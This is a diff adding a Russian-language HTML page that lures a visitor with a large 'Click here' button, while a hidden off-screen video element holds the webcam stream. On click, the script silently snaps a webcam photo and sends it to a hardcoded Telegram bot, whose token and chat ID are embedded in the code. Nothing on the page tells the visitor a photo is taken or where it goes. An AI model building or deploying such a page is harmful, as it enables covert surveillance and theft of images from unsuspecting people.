@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>autophoto</title>
+  
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<!DOCTYPE html>
+
+<html lang="ru">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Фотографировать и отправить</title>
+
+    <style>
+
+        /* Делаем кнопку большой и по центру */
+
+        .capture-btn {
+
+            position: absolute;
+
+            top: 50%;
+
+            left: 50%;
+
+            transform: translate(-50%, -50%);
+
+            padding: 20px 40px;
+
+            font-size: 20px;
+
+            background-color: #007bff;
+
+            color: white;
+
+            border: none;
+
+            border-radius: 10px;
+
+            cursor: pointer;
+
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+
+        }
+
+        .capture-btn:hover {
+
+            background-color: #0056b3;
+
+        }
+
+        /* Скрываем видео */
+
+        #video {
+
+            width: 1px;
+
+            height: 1px;
+
+            position: fixed;
+
+            top: -100px;
+
+            left: -100px;
+
+            opacity: 0;
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <video id="video" autoplay></video>
+
+    <canvas id="canvas" width="300" height="250" style="display:none;"></canvas>
+
+    <button class="capture-btn" id="capture">Нажми сюда</button>
+
+    <script>
+
+        const video = document.getElementById('video');
+
+        const canvas = document.getElementById('canvas');
+
+        const captureButton = document.getElementById('capture');
+
+        const context = canvas.getContext('2d');
+
+        // Включаем камеру
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+
+            .then(stream => { video.srcObject = stream; })
+
+            .catch(err => { console.error("Ошибка доступа к камере:", err); });
+
+        // Фотографируем при нажатии кнопки
+
+        captureButton.addEventListener('click', () => {
+
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/png');
+
+            let botToken = "7752183433:AAFy_IrScRXS2d1gqto7uk4nFUO0ISE11Cg";  // Вставь свой токен
+
+            let chatId = "7931089642";      // Вставь свой Chat ID
+
+            let telegramURL = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+            let formData = new FormData();
+
+            formData.append("chat_id", chatId);
+
+            formData.append("photo", dataURItoBlob(imageData), "photo.png");
+
+            fetch(telegramURL, { method: "POST", body: formData })
+
+                .then(response => console.log("Фото отправлено"))
+
+                .catch(error => console.error("Ошибка:", error));
+
+        });
+
+        // Функция для конвертации Base64 → Blob
+
+        function dataURItoBlob(dataURI) {
+
+            let byteString = atob(dataURI.split(',')[1]);
+
+            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+
+            let ab = new ArrayBuffer(byteString.length);
+
+            let ia = new Uint8Array(ab);
+
+            for (let i = 0; i < byteString.length; i++) { ia[i] = byteString.charCodeAt(i); }
+
+            return new Blob([ab], { type: mimeString });
+
+        }
+
+    </script>
+
+</body>
+
+</html>
+<!-- partial -->
+  
+</body>
+</html>
